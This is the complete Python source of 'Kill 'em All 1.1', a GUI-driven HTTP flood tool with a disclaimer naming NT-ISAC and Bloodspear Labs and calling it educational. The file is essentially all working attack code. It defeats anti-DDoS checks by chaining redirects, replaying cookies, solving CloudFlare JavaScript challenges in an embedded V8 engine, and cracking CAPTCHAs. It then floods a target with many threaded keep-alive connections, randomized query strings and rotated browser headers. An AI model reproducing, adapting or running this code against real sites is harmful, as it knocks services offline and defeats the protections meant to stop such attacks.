#from __future__ import with_statement
import kill_captcha

import Tkinter
import threading
import PyV8
import StringIO

import httplib
import socket
import random
import string
import logging

def authRedirect(dst):
    #print "bypassing redirect auth, now"
    #print "_______________________"
    logging.debug("redirect authenticate")    
    for i in [dst]*3:
        headers = {
            "Accept":"*/*",
            "Accept-Language":"en-us",
            "Accept-Encoding":"gzip, deflate",
            "User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 GTB7.1 ( .NET CLR 3.5.30729)",
            "Connection":"Keep-Alive",
            }
        host = i  # restore host to original inputted destination
        url = "http://"+host
        while url!="":
            components = url.split("/")
            if components[0]=="http:" and components[1]=="":
                host = components[2]
                path = "/"+"/".join(components[3:])
            else:
                path = "/"+"/".join(components[1:])
            #print "redirect URL is "+str(url)
            #print "it is final url "+path
            #referer = ""
            #if "Referer" in headers:
            #    referer = headers["Referer"]
            #
            try:
                conn = httplib.HTTPConnection(host)
                conn.request("GET", path, "", headers)
                response = conn.getresponse()
                conn.close()
            except IOError, e:
                logging.debug(e)
            frame.labelStatus.configure(text="HTTP/1.1 "+str(response.status)+" "+str(response.reason))
            if response.status==200:
                _threadResults.update({"Fill":"green"})
            else:
                _threadResults.update({"Fill":"red"})
            #print "reply HTTP "+str(response.status)+" "+str(response.reason)+"\n"
            #print "The referer IP is "+str(url)
            headers.update({"Referer":url})
            url = response.getheader("location", "")
    logging.debug("redirect bypass")
    return {"Host":host, "Path":path, "Referer":url}

def authCookie(dst, cookieField):
    #print "bypassing cookies auth, now"
    #print "_______________________"
    logging.debug("cookie authenticate")
    cookie = ""
    for i in [dst]*3:
        headers = {
            "Accept":"*/*",
            "Accept-Language":"en-us",
            "Accept-Encoding":"gzip, deflate",
            "User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 GTB7.1 ( .NET CLR 3.5.30729)",
            "Connection":"Keep-Alive",
            }
        host = i  # restore host to original inputted destination
        url = "http://"+host
        while url!="":
            if cookie!="":
                headers.update({"Cookie":cookie})
            components = url.split("/")
            if components[0]=="http:" and components[1]=="":
                host = components[2]
                path = "/"+"/".join(components[3:])
            else:
                path = "/"+"/".join(components[1:])
            #print "redirect URL is "+str(url)
            #print "cookie is "+str(cookie)
            #print "it is final url "+path
            #referer = ""
            #if "Referer" in headers:
            #    referer = headers["Referer"]
            cookie = ""
            if "Cookie" in headers:
                cookie = headers["Cookie"]
            #
            try:
                conn = httplib.HTTPConnection(host)
                conn.request("GET", path, "", headers)
                response = conn.getresponse()
                conn.close()
            except IOError, e:
                logging.debug(e)
            frame.labelStatus.configure(text="HTTP/1.1 "+str(response.status)+" "+str(response.reason))
            if response.status==200:
                _threadResults.update({"Fill":"green"})
            else:
                _threadResults.update({"Fill":"red"})
            #print "reply HTTP "+str(response.status)+" "+str(response.reason)+"\n"
            #print "The referer IP is "+str(url)
            headers.update({"Referer":url})
            url = response.getheader("location", "")
            if url!="":
                if cookieField=="Cookie":
                    cookie = response.getheader("Set-Cookie", "")
                else:
                    cookie = response.getheader(cookieField, "")
    logging.debug("cookie bypass")
    return {"Host":host, "Path":path, "Referer":url, "Cookie":cookie}

def authJavascript(dst, jsLock, authEvent):
    #print "bypassing javascript auth, now"
    #print "_______________________"
    logging.debug("javascript authenticate")
    for i in [dst]*1:  # loop once only
        headers = {
            "Accept":"image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*",
            "Accept-Language":"en-us",
            "Accept-Encoding":"gzip, deflate",
            "User-Agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)",
            "Connection":"Keep-Alive",
            }
        host = i  # restore host to original inputted destination
        url = "http://"+host
        cookie = ""
        method = "GET"
        body = ""
        while url!="":
            if cookie!="":
                headers.update({"Cookie":cookie})
            components = url.split("/")
            if components[0]=="http:" and components[1]=="":
                host = components[2]
                path = "/"+"/".join(components[3:])
            else:
                path = "/"+"/".join(components[1:])
            #print "it is final url "+path
            referer = ""
            if "Referer" in headers:
                referer = headers["Referer"]
            cookie = ""
            if "Cookie" in headers:
                cookie = headers["Cookie"]
            #
            try:
                conn = httplib.HTTPConnection(host)
                conn.request(method, path, body, headers)
                response = conn.getresponse()
                html = response.read()
                conn.close()
            except IOError, e:
                logging.debug(e)
            frame.labelStatus.configure(text="HTTP/1.1 "+str(response.status)+" "+str(response.reason))
            if response.status==200:
                _threadResults.update({"Fill":"green"})
            else:
                _threadResults.update({"Fill":"red"})
            #print "reply HTTP "+str(response.status)+" "+str(response.reason)+"\n"
            #print html
            script = kill_captcha.JsHTMLParser(html).getScriptData()
            script = script.replace("eval", "return")
            if "ChallengeForm" in html:  # CloudFlare
                pos = script.find("a.val(")
                script = script[pos+5:script.find(");", pos+5)+1]
                script = script+"+"+str(len(host))
            jsLock.acquire()
            try:
                jsContext = PyV8.JSContext()
                jsContext.enter()
                jsSubmit = str(jsContext.eval(script))
                jsContext.leave()
                if "?NSID=" in jsSubmit:  # ADS
                    url = host+path+jsSubmit.split("\"")[1]
                elif response.status==503:  # CloudFlare
                    url = kill_captcha.JsHTMLParser(html).getFormAction()
                    cookie = response.getheader("Set-Cookie", "")
                    pos = cookie.find(";");
                    cookie = cookie[:pos]
                    method = kill_captcha.JsHTMLParser(html).getFormMethod()
                    inputs = kill_captcha.JsHTMLParser(html).getFormInputs()
                    inputs["jschl_answer"] = jsSubmit
                    body = ""
                    for key in inputs:
                        body = body+key+"="+inputs[key]+"&"
                    body = body[:-1]
                    headers.update({"Referer":url})
                    headers.update({"Cookie":cookie})
                    headers.update({"Content-Type":"application/x-www-form-urlencoded"})
                    headers.update({"Content-Length":str(len(body))})
                    headers.update({"Cache-Control":"no-cache"})
                    authEvent.wait(5.850)
                elif response.status==302:  # CloudFlare
                    url = host+path
                    cookie = cookie+"; "+response.getheader("Set-Cookie", "")
                    pos = cookie.find(";");
                    pos = cookie.find(";", pos+1);
                    cookie = cookie[:pos]
                    method = "GET"
                    body = ""
                    headers.update({"Cookie":cookie})
                    del headers['Content-Type']
                    del headers['Content-Length']
                else:  # CloudFlare
                    url = ""
                    method = "GET"
                    body = ""
                #print "It is JS authcode "+jsSubmit
            except PyV8.JSError, e:
                url = ""
            except:
                url = ""
            finally:
                jsLock.release()
    logging.debug("javascript bypass")
    return {"Host":host, "Path":path, "Referer":url, "Cookie":cookie}

def authCaptcha(dst):
    #print "bypassing captcha auth, now"
    #print "_______________________"
    logging.debug("captcha authenticate")
    for i in [dst]*3:
        headers = {
            "Accept":"*/*",
            "Accept-Language":"en-us",
            "Accept-Encoding":"gzip, deflate",
            "User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 GTB7.1 ( .NET CLR 3.5.30729)",
            "Connection":"Keep-Alive",
            }
        host = i  # restore host to original inputted destination
        url = "http://"+host
        cookie = ""
        while url!="":
            if cookie!="":
                headers.update({"Cookie":cookie})
            components = url.split("/")
            if components[0]=="http:" and components[1]=="":
                host = components[2]
                path = "/"+"/".join(components[3:])
            else:
                path = "/"+"/".join(components[1:])
            #print "it is final url "+path
            #referer = ""
            #if "Referer" in headers:
            #    referer = headers["Referer"]
            cookie = ""
            if "Cookie" in headers:
                cookie = headers["Cookie"]
            #
            try:
                conn = httplib.HTTPConnection(host)
                conn.request("GET", path, "", headers)
                response = conn.getresponse()
                html = response.read()
                conn.close()
            except IOError, e:
                logging.debug(e)
            frame.labelStatus.configure(text="HTTP/1.1 "+str(response.status)+" "+str(response.reason))
            if response.status==200:
                _threadResults.update({"Fill":"green"})
            else:
                _threadResults.update({"Fill":"red"})
            #print "reply HTTP "+str(response.status)+" "+str(response.reason)+"\n"
            #print html.encode("hex")
            if html.startswith("BM"):
                img = kill_captcha.prepare(StringIO.StringIO(html))
                bounds = kill_captcha.separate(img)
                cookie = "COLLPIC="+kill_captcha.recognize(img, bounds)
                url = "http://"+host
                #print "Captcha authcode added in Cookie is "+cookie
            elif "cookie=\"COLLPIC=" in html:
                if cookie=="":
                    url = kill_captcha.JsHTMLParser(html).getImgSrc()
                else:  # if wrong captcha
                    url = ""
                    path = "/"
            else:  # if correct captcha
                url = ""
                path = "/"
    logging.debug("captcha bypass")
    return {"Host":host, "Path":path, "Referer":url, "Cookie":cookie}

def authThread(threadId, killEvent, authEvent, authInterval, isRedirect, isCookie, isJavascript, isCaptcha, dst, cookieField, jsLock):
    while (not killEvent.isSet()):  # when sleep is timeout naturally
        authEvent.clear()  # notify killThread to wait
        authResults = {}
        if isRedirect:
            authResults.update(authRedirect(dst))
        if isCookie:
            authResults.update(authCookie(dst, cookieField))
        if isJavascript:
            authResults.update(authJavascript(dst, jsLock, authEvent))
        if isCaptcha:
            authResults.update(authCaptcha(dst))
        _threadResults.update(authResults)
        #logging.debug(_threadResults)
        authEvent.set()  # notify killThread to start
        killEvent.wait(authInterval)

def killThread(threadId, killEvent, authEvent, src, dst, numRqst, connInterval, rqstInterval, holdBefore, holdAfter, customHeader, cookieField):
    authResults = {
        "Accept":random.choice(ACCEPT),
        "User-Agent":random.choice(USER_AGENT),
        }
    authEvent.wait()  # wait authThread to notify
    #logging.debug("prepare")
    killEvent.wait(connInterval*(threadId-1))  # threadId begins with 1
    #logging.debug("start")
    if not killEvent.isSet():  # if sleep is timeout naturally
        authEvent.wait()  # wait authThread to notify
        authResults.update(_threadResults)
        logging.debug("connection establish")
        #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ##sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
        ##sock.bind((src, 0))  
        #sock.connect((authResults["Host"], 80))
        conn = httplib.HTTPConnection(authResults["Host"])
        killEvent.wait(holdBefore)
        while (not killEvent.isSet()) and numRqst>0:  # when sleep is timeout naturally
            authEvent.wait()  # wait authThread to notify
            authResults.update(_threadResults)
            #logging.debug("connection send request "+str(numRqst))
            querystr = ''.join(random.choice(string.ascii_uppercase+string.digits) for i in range(8))
            rqstPrefix = (
                "GET "+authResults["Path"]+"?"+querystr+" HTTP/1.1\r\n"
                "Accept: "+authResults["Accept"]+"\r\n"
                "Accept-Language: en-us\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                "User-Agent: "+authResults["User-Agent"]+"\r\n"
                "Host: "+authResults["Host"]+"\r\n"
                "X-Bloodspear: bloodspear.org\r\n"
                )
            rqstHeader = ""
            if customHeader!="":
                rqstHeader = rqstHeader+customHeader+"\r\n"
            if authResults["Cookie"]!="":
                rqstHeader = rqstHeader+cookieField+": "+authResults["Cookie"]+"\r\n"
            if authResults["Referer"]!="":
                rqstHeader = rqstHeader+"Referer: "+authResults["Referer"]+"\r\n"
            rqstSuffix = (
                "Connection: Keep-Alive\r\n"
                "\r\n"
                )
            httpRequest = rqstPrefix+rqstHeader+rqstSuffix
            #logging.debug(httpRequest)
            conn.send(httpRequest)
            #sock.send(httpRequest)
            numRqst = numRqst-1
            if numRqst>0:
                killEvent.wait(rqstInterval)
        killEvent.wait(holdAfter)
        conn.close()
        #sock.close()
        logging.debug("connection close")
    #logging.debug("stop")

def killCallback():
    src = frame.entrySrc.get().strip()  # the "auto detect" string
    dst = frame.entryDst.get().strip()  # the domain
    authInterval = float(frame.entryAuthInterval.get().strip())
    numConn = int(frame.spinboxNumConn.get().strip())
    numRqst = int(frame.spinboxNumRqst.get().strip())
    connInterval = float(frame.entryConnInterval.get().strip())
    rqstInterval = float(frame.entryRqstInterval.get().strip())
    holdBefore = float(frame.entryHoldBefore.get().strip())
    holdAfter = float(frame.entryHoldAfter.get().strip())
    customHeader = frame.entryCustomHeader.get().strip()
    cookieField = frame.entryCookieField.get().strip()
    jsLock = threading.Lock()
    if hasattr(PyV8, 'JSLocker'):
        jsLock = PyV8.JSLocker()
        jsLock.acquire = jsLock.enter
        jsLock.release = jsLock.leave
    _threadResults.update({
        "Fill":"grey",
        "Host":dst,
        "Path":"/",
        "Referer":"",
        "Cookie":"",
        })
    THREAD_EVENT.clear()
    frame.labelStatus.configure(text=" ")
    frame.buttonKill.configure(text="Stop!", command=stopCallback)
    authEvent = threading.Event()
    threading.Thread(name="Thread-0", target=authThread, args=(0, THREAD_EVENT, authEvent, authInterval, tkRedirect.get()==1, tkCookie.get()==1, tkJavascript.get()==1, tkCaptcha.get()==1, dst, cookieField, jsLock)).start()
    for i in range(1, numConn+1):
        threading.Thread(target=killThread, args=(i, THREAD_EVENT, authEvent, src, dst, numRqst, connInterval, rqstInterval, holdBefore, holdAfter, customHeader, cookieField)).start()

def stopCallback():
    THREAD_EVENT.set()
    frame.buttonKill.configure(text="KILL 'em !!", command=killCallback)

def cookieCallback():
    if tkCookie.get()==1:
        frame.entryCookieField.configure(state=Tkinter.NORMAL)
    else:
        frame.entryCookieField.configure(state=Tkinter.DISABLED)
    
def onQuitFrame():
    THREAD_EVENT.set()
    root.destroy()

def drawFrame():
    frame.canvasStatus.itemconfigure("STATUS", fill=_threadResults["Fill"])
    root.after(1000/60, drawFrame)

def createFrame():
    global tkRedirect, tkCookie, tkJavascript, tkCaptcha
    tkRedirect = Tkinter.IntVar()
    tkCookie = Tkinter.IntVar()
    tkJavascript = Tkinter.IntVar()
    tkCaptcha = Tkinter.IntVar()
    caveats = [
        "  Version 1.0 Caveat:",
        "Only support IPv4.",
        "Source IP not spoofable.",
        "Limited CAPTCHA cracking capability.",
        "Watermark embedded for easy detection.",
        ]
    
    # top panel
    frame.labelDesc = Tkinter.Label(frame, text="\t\t\t\t\t\t\t\t\n        *  ".join(caveats), bg="grey", fg="white", justify=Tkinter.LEFT)
    frame.labelDesc.grid(row=0, column=0, rowspan=1, columnspan=5, sticky=Tkinter.E+Tkinter.W)
    # left panel
    frame.labelSrc = Tkinter.Label(frame, text="Source IP:")
    frame.labelSrc.grid(row=1, column=0, rowspan=1, columnspan=2, sticky=Tkinter.E)
    frame.entrySrc = Tkinter.Entry(frame)
    frame.entrySrc.grid(row=1, column=2, rowspan=1, columnspan=1, sticky=Tkinter.E+Tkinter.W, pady=2)
    frame.entrySrc.insert(0, "auto detect")#socket.gethostbyname(socket.gethostname())
    frame.entrySrc.config(state=Tkinter.DISABLED)
    frame.labelDst = Tkinter.Label(frame, text="Target URL:")
    frame.labelDst.grid(row=2, column=0, rowspan=1, columnspan=2, sticky=Tkinter.E)
    frame.entryDst = Tkinter.Entry(frame)
    frame.entryDst.grid(row=2, column=2, rowspan=1, columnspan=1, sticky=Tkinter.E+Tkinter.W, pady=2)
    frame.entryDst.insert(0, "")
    frame.labelFrameAuth = Tkinter.LabelFrame(frame, text="Authentication Bypass", fg="grey")
    frame.labelFrameAuth.grid(row=3, column=0, rowspan=2, columnspan=3, sticky=Tkinter.E+Tkinter.W, padx=2, pady=2)
    frame.checkbuttonRedirect = Tkinter.Checkbutton(frame.labelFrameAuth, text="HTTP Redirect", variable=tkRedirect)
    frame.checkbuttonRedirect.grid(row=0, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.checkbuttonCookie = Tkinter.Checkbutton(frame.labelFrameAuth, text="HTTP Cookie  (Header field:", variable=tkCookie, command=cookieCallback)
    frame.checkbuttonCookie.grid(row=1, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.entryCookieField = Tkinter.Entry(frame.labelFrameAuth, width=10)
    frame.entryCookieField.grid(row=1, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryCookieField.insert(0, "Cookie")
    frame.entryCookieField.config(state=Tkinter.DISABLED)
    frame.labelCookieField = Tkinter.Label(frame.labelFrameAuth, text=")")
    frame.labelCookieField.grid(row=1, column=3, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.checkbuttonJavascript = Tkinter.Checkbutton(frame.labelFrameAuth, text="JavaScript", variable=tkJavascript)
    frame.checkbuttonJavascript.grid(row=2, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.checkbuttonCaptcha = Tkinter.Checkbutton(frame.labelFrameAuth, text="CAPTCHA", variable=tkCaptcha)
    frame.checkbuttonCaptcha.grid(row=3, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.labelAuthInterval = Tkinter.Label(frame.labelFrameAuth, text="Reauth every (second):")
    frame.labelAuthInterval.grid(row=4, column=0, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryAuthInterval = Tkinter.Entry(frame.labelFrameAuth, width=7)
    frame.entryAuthInterval.grid(row=4, column=1, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryAuthInterval.insert(0, "300.0")
    # right top panel
    frame.labelFrameTcp = Tkinter.LabelFrame(frame, text="TCP Traffic Model", fg="grey")
    frame.labelFrameTcp.grid(row=1, column=3, rowspan=3, columnspan=2, sticky=Tkinter.E+Tkinter.W, padx=2, pady=2)
    frame.labelNumConn = Tkinter.Label(frame.labelFrameTcp, text="Number of connections:")
    frame.labelNumConn.grid(row=0, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.spinboxNumConn = Tkinter.Spinbox(frame.labelFrameTcp, width=6, from_=0, to=1000)
    frame.spinboxNumConn.grid(row=0, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.spinboxNumConn.delete(0, Tkinter.END)
    frame.spinboxNumConn.insert(0, "10")
    frame.labelConnInterval = Tkinter.Label(frame.labelFrameTcp, text="Connections interval (second):")
    frame.labelConnInterval.grid(row=1, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.entryConnInterval = Tkinter.Entry(frame.labelFrameTcp, width=7)
    frame.entryConnInterval.grid(row=1, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryConnInterval.insert(0, "5.0")
    frame.labelHoldBefore = Tkinter.Label(frame.labelFrameTcp, text="Connection hold time before first request (second):")
    frame.labelHoldBefore.grid(row=2, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.entryHoldBefore = Tkinter.Entry(frame.labelFrameTcp, width=7)
    frame.entryHoldBefore.grid(row=2, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryHoldBefore.insert(0, "1.0")
    frame.labelHoldAfter = Tkinter.Label(frame.labelFrameTcp, text="Connection idle timeout after last request (second):")
    frame.labelHoldAfter.grid(row=3, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.entryHoldAfter = Tkinter.Entry(frame.labelFrameTcp, width=7)
    frame.entryHoldAfter.grid(row=3, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryHoldAfter.insert(0, "1.0")
    # right bottom panel
    frame.labelFrameHttp = Tkinter.LabelFrame(frame, text="HTTP Traffic Model", fg="grey")
    frame.labelFrameHttp.grid(row=4, column=3, rowspan=1, columnspan=2, sticky=Tkinter.E+Tkinter.W, padx=2, pady=2)
    frame.labelNumRqst = Tkinter.Label(frame.labelFrameHttp, text="Number of requests per connection:")
    frame.labelNumRqst.grid(row=0, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.spinboxNumRqst = Tkinter.Spinbox(frame.labelFrameHttp, width=6, from_=0, to=1000)
    frame.spinboxNumRqst.grid(row=0, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.spinboxNumRqst.delete(0, Tkinter.END)
    frame.spinboxNumRqst.insert(0, "10")
    frame.labelRqstInterval = Tkinter.Label(frame.labelFrameHttp, text="Requests interval (second):")
    frame.labelRqstInterval.grid(row=1, column=0, rowspan=1, columnspan=2, sticky=Tkinter.W)
    frame.entryRqstInterval = Tkinter.Entry(frame.labelFrameHttp, width=7)
    frame.entryRqstInterval.grid(row=1, column=2, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryRqstInterval.insert(0, "5.0")
    frame.labelCustomHeader = Tkinter.Label(frame.labelFrameHttp, text="Custom header:")
    frame.labelCustomHeader.grid(row=2, column=0, rowspan=1, columnspan=1, sticky=Tkinter.W)
    frame.entryCustomHeader = Tkinter.Entry(frame.labelFrameHttp, width=35)
    frame.entryCustomHeader.grid(row=2, column=1, rowspan=1, columnspan=2, sticky=Tkinter.W)
    # bottom panel
    frame.labelDisclaimer = Tkinter.Label(frame, text="Disclaimer:  This tool is purely for education and research purposes.  NT-ISAC and Bloodspear Labs\nis not responsible for any loss or damage arising from any use or misuse of this tool.", fg="red", justify=Tkinter.RIGHT)
    frame.labelDisclaimer.grid(row=5, column=0, rowspan=1, columnspan=4, sticky=Tkinter.W)
    frame.buttonKill = Tkinter.Button(frame, text="KILL 'em !!", fg="red", width=6, command=killCallback)
    frame.buttonKill.grid(row=5, column=4, rowspan=1, columnspan=1, sticky=Tkinter.E, ipadx=20, padx=2, pady=2)
    frame.labelCanvas = Tkinter.Label(frame, text=" ", compound=Tkinter.LEFT, bg="grey")
    frame.labelCanvas.grid(row=6, column=0, rowspan=1, columnspan=5, sticky=Tkinter.E+Tkinter.W)
    frame.canvasStatus = Tkinter.Canvas(frame, width=15, height=15, borderwidth=-2, bg="grey")
    frame.canvasStatus.grid(row=6, column=0, rowspan=1, columnspan=1, ipadx=0, ipady=0, padx=0, pady=0)
    frame.canvasStatus.create_oval(0, 0, 15, 15, width=2, fill="grey", outline="grey", tag="STATUS")
    frame.labelStatus = Tkinter.Label(frame, text=" ", bg="grey")
    frame.labelStatus.grid(row=6, column=1, rowspan=1, columnspan=4, sticky=Tkinter.W)

logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s")
_threadResults = {"Fill":"grey"}
THREAD_EVENT = threading.Event()
ACCEPT = [
    "*/*",
    "image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    ]
USER_AGENT = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 GTB7.1 ( .NET CLR 3.5.30729)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; bgft)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
    "Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/xxx.x (KHTML like Gecko) Safari/12x.x",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19",
    "Mozilla/5.0 (Windows NT 5.2; rv:6.0) Gecko/20100101 Firefox/6.0",
    ]

try:
    root = Tkinter.Tk()
    root.title("Kill 'em All  1.1")
    #root.geometry(str(WIDTH+10)+"x"+str(HEIGHT+10)+"+100+100")
    root.wm_protocol("WM_DELETE_WINDOW", onQuitFrame)
    frame = Tkinter.Frame(root)
    frame.pack()
    createFrame()
    drawFrame()
    root.mainloop()
except:
    onQuitFrame()

